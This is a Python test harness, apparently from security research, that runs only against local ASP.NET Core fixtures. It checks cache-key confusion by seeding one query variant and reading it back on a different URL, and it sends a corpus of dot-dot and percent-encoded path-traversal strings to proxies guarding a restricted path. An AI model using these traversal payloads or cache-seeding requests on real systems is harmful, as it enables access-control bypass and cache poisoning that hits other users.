#!/usr/bin/env python3
"""Fifth-pass: bounded loopback mixed-normalization corpus and reverse cache seeding."""
import argparse, http.client, json, time

HOST="127.0.0.1"
PORTS={"original_normalized":5116, "extra_guard":5118}
APP=5100
cases={}
checks={}
def get(target,port=APP,headers=None):
    if port not in (APP,*PORTS.values()):raise RuntimeError("only local fixture ports permitted")
    conn=http.client.HTTPConnection(HOST,port,timeout=8)
    conn.putrequest("GET",target,skip_host=True,skip_accept_encoding=True)
    conn.putheader("Host",f"{HOST}:{port}")
    conn.putheader("Connection","close")
    for k,v in (headers or {}).items():conn.putheader(k,v)
    conn.endheaders()
    response=conn.getresponse()
    result={"port":port,"request_target":target,"status":response.status,
            "headers":{k.lower():v for k,v in response.getheaders()},
            "body":response.read().decode("utf-8","replace")}
    conn.close()
    return result
def ok(label,p):checks[label]=bool(p)
def reverse_cache(name,version):
    path=f"/fifth/{name}/reverse"
    # Seed with B, then request distinct query A on the same cache key.
    # This reverses the first four rounds' seeding direction.
    seed=get(path+"?a%3DB=");time.sleep(.6)
    repeat=get(path+"?a%3DB=");time.sleep(.3)
    intended_A=get(path+"?a=B%3D")
    expected=name=="output" or version==10
    etag= intended_A["headers"].get("etag")
    # The client saw B data on A's URL. Revalidate using the *observed*
    # validator for that URL, not the original attacker's validator.
    revalidated=get(path+"?a=B%3D",headers={"If-None-Match":etag}) if etag else {}
    cases[name+"_reverse"]={
        "seed_B":seed,"repeat_B":repeat,"victim_A":intended_A,
        "victim_A_revalidate_using_issued_etag":revalidated}
    ok(name+"_B_seed_ok", seed["status"]==200 and "variant=B" in seed["body"])
    ok(name+"_B_repeated_from_cache",repeat["body"]==seed["body"])
    ok(name+"_reverse_victim_variant_expected",
       ("variant=B" in intended_A["body"]) == expected)
    ok(name+"_reverse_victim_etag_expected",
       (etag == seed["headers"].get("etag")) == expected)
    ok(name+"_revalidated_observed_etag",revalidated.get("status")==304)
    if name=="output":
        ok("output_crossed_CSP_policy",
           intended_A["headers"].get("content-security-policy")=="default-src 'self'")
    return cases[name+"_reverse"]
def proxy_corpus(major):
    corpus={
      "plain_parent":"/public/../gate/private-document",
      "encoded_parent":"/public/%2e%2e/gate/private-document",
      "upper_encoded_parent":"/public/%2E%2E/gate/private-document",
      "mixed_encoded_parent":"/public/.%2e/gate/private-document",
      "mixed_encoded_parent2":"/public/%2e./gate/private-document",
      "encoded_parent_and_slash":"/public/%2e%2e%2fgate/private-document",
      "upper_encoded_parent_and_slash":"/public/%2E%2E%2Fgate/private-document",
      "mixed_encoded_slash":"/public/.%2e%2fgate/private-document",
      "encoded_slash_parent":"/public%2F..%2Fgate/private-document",
      "plain_parent_encoded_slash":"/public/..%2Fgate/private-document",
      "nested_parent":"/public/next/../../gate/private-document",
      "nested_encoded_parent":"/public/next/%2e%2e/%2e%2e/gate/private-document",
      "duplicate_slashes_parent":"/public//../gate/private-document",
      "double_encoded_parent":"/public/%252e%252e/gate/private-document",
      "double_encoded_slash":"/gate%252Fprivate-document",
      "backslash":"/gate%5cprivate-document",
      "encoded_lower_slash":"/gate%2fprivate-document",
      "encoded_g_and_slash":"/%67ate%2Fprivate-document",
      "plain_dot":"/public/./../gate/private-document",
      "encoded_dot":"/public/%2e/../gate/private-document",
      "literal_parent_at_root":"/../gate/private-document",
      "unrelated_control":"/healthz",
      "canonical_denied":"/gate/private-document",
    }
    observed={}
    for label,path in corpus.items():
        observed[label]={}
        for proxy_label,port in PORTS.items():
            observed[label][proxy_label]=get(f"http://{HOST}:{port}{path}",port)
    cases["path_corpus"]=observed
    # A returned 200 on a synthetic restricted endpoint is an interesting
    # proxy-policy counterexample, NOT a report of app-level auth bypass.
    cases["proxy_200_cases"]={
       name:[case_name for case_name,rows in observed.items()
             if case_name!="unrelated_control" and rows[name]["status"]==200]
       for name in PORTS}
    ok("normalize_proxies_serve_unrestricted_control",all(
        observed["unrelated_control"][name]["status"]==200 for name in PORTS))
    ok("normalize_proxies_deny_canonical",all(
        observed["canonical_denied"][name]["status"]==403 for name in PORTS))
    ok("extra_guard_original_slash_denied",
       observed["encoded_lower_slash"]["extra_guard"]["status"]==403)
    ok("original_normalized_parent_denied",
       observed["plain_parent"]["original_normalized"]["status"]==403)
    # Count and record any extra guard failures without asserting that this
    # restricted corpus is exhaustive for every encoding.
    cases["guarded_200_count"]=len(cases["proxy_200_cases"]["extra_guard"])
    # Ensure upstream route bypasses never become built-in application auth bypass
    auth={}
    for label,port in PORTS.items():
        auth[label]=get(f"http://{HOST}:{port}/public/../gate/auth-private-document",port)
    cases["application_auth_control"]=auth
    ok("application_auth_boundary_intact",
       all(row["status"] in (401,403,404) for row in auth.values()))

def main():
    p=argparse.ArgumentParser()
    p.add_argument("--major",type=int,choices=(10,11),required=True)
    p.add_argument("--output",required=True)
    args=p.parse_args()
    try:
        reverse_cache("output",args.major)
        reverse_cache("response",args.major)
        proxy_corpus(args.major)
    except Exception as e:
        cases["harness_exception"]={"class":type(e).__name__,"message":str(e)}
        ok("harness_finished",False)
    result={"framework":f"ASP.NET Core {args.major}.0","scope":"fixed corpus, 127.0.0.1 only",
            "checks":checks,"passed":sum(checks.values()),"total":len(checks),
            "failed_checks":[name for name,pass_ in checks.items() if not pass_],
            "observations":cases}
    with open(args.output,"w") as f:json.dump(result,f,indent=2)
    print(json.dumps({"framework":result["framework"],
          "passed":result["passed"],"total":result["total"],
          "failed_checks":result["failed_checks"],
          "reverse_output":{"seed":cases.get("output_reverse",{}).get("seed_B",{}).get("body"),
                             "victim":cases.get("output_reverse",{}).get("victim_A",{}).get("body"),
                             "csp":cases.get("output_reverse",{}).get("victim_A",{}).get("headers",{}).get("content-security-policy")},
          "reverse_response":{"seed":cases.get("response_reverse",{}).get("seed_B",{}).get("body"),
                             "victim":cases.get("response_reverse",{}).get("victim_A",{}).get("body")},
          "policy_bypass_cases":cases.get("proxy_200_cases")},indent=2))
    return 0 if all(checks.values()) else 1
if __name__=="__main__":raise SystemExit(main())
